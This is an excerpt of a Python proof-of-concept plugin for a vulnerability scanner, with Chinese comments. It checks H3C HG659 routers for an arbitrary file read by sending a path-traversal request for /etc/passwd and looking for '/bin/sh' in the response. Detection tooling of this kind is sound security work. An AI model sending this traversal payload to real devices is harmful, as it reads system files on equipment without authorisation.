...
POC_NAME = "H3CHG659LibAnArbitraryFileRead"    # PoC脚本中实现的类名，osprey架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class H3CHG659LibAnArbitraryFileRead(BasePoc):
    ...
    poc_info = {
        'poc': {
            'Id': 'vb_2021_0031',    # PoC的VID编号
            'vbid': '',
            'Name': 'H3CHG659LibAnArbitraryFileRead',    # PoC名称
            'Author': 'wuqiang.zhang',    # PoC作者
            'Create_date': '2021-07-15',    # PoC创建时间
            },

        'vul': {
            'Product': 'H3C HG659',    # 漏洞所在产品名称
            'Version': '',    # 产品的版本号
            'Type': 'File Read',    # 漏洞类型
    ...
    def verify(self, first=False):
        ...
        # 以下是PoC的检测逻辑
        url = urljoin(target,'/lib///....//....//....//....//....//....//....//....//etc//passwd')
        # 使用req做HTTP请求的发送和响应的处理，req是TCC框架将requests的HTTP请求方法封装成统一的req函数，使用req(url, method, **kwargs)，参数传递同requests
        resp = req(url, 'get',  allow_redirects=False)
        if resp is not None:
            location = resp.text

        if "/bin/sh" in location:
            self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
            self.scan_info['Ret']['VerifyInfo']['URL'] = url    # 记录漏洞相关的一些额外信息（可选）
            self.scan_info['Ret']['VerifyInfo']['DATA'] = "X-Rewrite-Url:" 
            if verbose:
                highlight('[*] H3C HG659 Lib An Arbitrary FileRead found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息
        else:
            if verbose:
                highlight('[*] H3C HG659 Lib An Arbitrary FileRead not found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息
